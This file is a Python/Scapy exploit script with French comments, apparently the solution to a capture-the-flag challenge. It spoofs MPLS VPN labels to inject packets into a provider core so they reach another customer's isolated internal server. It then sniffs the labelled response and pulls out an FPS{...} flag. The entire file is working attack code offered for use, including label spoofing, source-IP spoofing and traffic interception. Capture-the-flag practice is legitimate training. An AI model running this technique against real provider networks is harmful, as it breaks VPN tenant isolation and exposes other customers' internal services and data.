#!/usr/bin/env python3
"""Label spoofing MPLS : injecter dans le coeur un paquet etiquete avec le
label VPN de CLIENT-C (vu dans le defi 'etiquettes') pour atteindre son serveur
interne isole, puis sniffer la reponse labellisee qui repart sur le segment.

Usage : python3 inject.py <label_vpn> [dst] [dport] [src_site1]
  ex.  : python3 inject.py 1000 192.168.22.2 5000 192.168.11.50
"""
import re
import sys
import time

from scapy.all import (Ether, IP, UDP, sendp, AsyncSniffer,
                       get_if_hwaddr, getmacbyip, conf)
from scapy.contrib.mpls import MPLS

conf.verb = 0
IFACE = "data"
PE2 = "10.1.23.3"

label = int(sys.argv[1]) if len(sys.argv) > 1 else 1000
dst = sys.argv[2] if len(sys.argv) > 2 else "192.168.22.2"
dport = int(sys.argv[3]) if len(sys.argv) > 3 else 5000
src = sys.argv[4] if len(sys.argv) > 4 else "192.168.11.50"

frame = (Ether(src=get_if_hwaddr(IFACE), dst=getmacbyip(PE2)) /
         MPLS(label=label, s=1, ttl=64) /
         IP(src=src, dst=dst) / UDP(sport=40000, dport=dport) / b"admin?")

sniff = AsyncSniffer(iface=IFACE, store=1)   # sniff natif (pas de filtre BPF)
sniff.start()
time.sleep(1)
print(f"[+] injection label={label} -> {dst}:{dport} (src spoofee {src})")
sendp(frame, iface=IFACE, count=3)
time.sleep(3)
pkts = sniff.stop()

for p in pkts:
    raw = bytes(p)
    if b"secret=" not in raw:
        continue
    m = re.search(rb"FPS\{[^}]+\}", raw)
    if m:
        print("[+] reponse labellisee interceptee ->", m.group(0).decode())
        sys.exit(0)
print("[-] rien intercepte (verifier le label VPN et les adresses)")
sys.exit(1)
